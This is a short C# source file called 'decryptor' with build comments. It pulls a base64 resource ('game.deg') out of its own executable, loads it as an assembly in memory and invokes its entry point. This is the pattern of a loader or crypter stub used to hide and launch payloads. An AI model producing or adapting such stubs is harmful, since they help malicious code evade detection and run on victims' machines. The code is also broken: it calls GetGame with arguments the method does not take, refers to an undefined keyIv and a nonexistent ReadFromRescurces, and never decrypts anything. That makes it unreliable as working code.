/*
 * commpiling with:
 * csc /out:<EndFile.exe> /res:<game.deg>,code /res:<id.txt>,id,private /reference:System.Net.Http.dll /reference:System.Security.Cryptography.Primitives.dll <decryptor.cs>
 * csc /out:EndFile.exe /res:game.deg,code /res:id.txt,id,private /reference:System.Net.Http.dll /reference:System.Security.Cryptography.Primitives.dll decryptor.cs
 * in Developrt command prompt for VS 2017
 * 
 * 
 * 
 * 
 * no encryption blocker
 */
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Windows.Forms;



namespace decryptor
{
    class Program
    {

        static void Main(string[] args)
        {

            byte[] code = GetGame(keyIv[0], keyIv[1]);
            RunCSExe(code);
        }


        public static void RunCSExe(byte[] code)
        {

            Assembly a = Assembly.Load(code);
            MethodInfo method = a.EntryPoint;

            if (method != null)
            {
                object o = a.CreateInstance(method.Name);
                try
                {
                    method.Invoke(o, null);
                }
                catch
                {
                    method.Invoke(o, new object[] { new string[0] });
                }
                //
            }
        }

        public static byte[] GetGame()
        {
            string b64 = ReadFromRescurces("code");
            
            return Convert.FromBase64String(b64);

        }
    }
}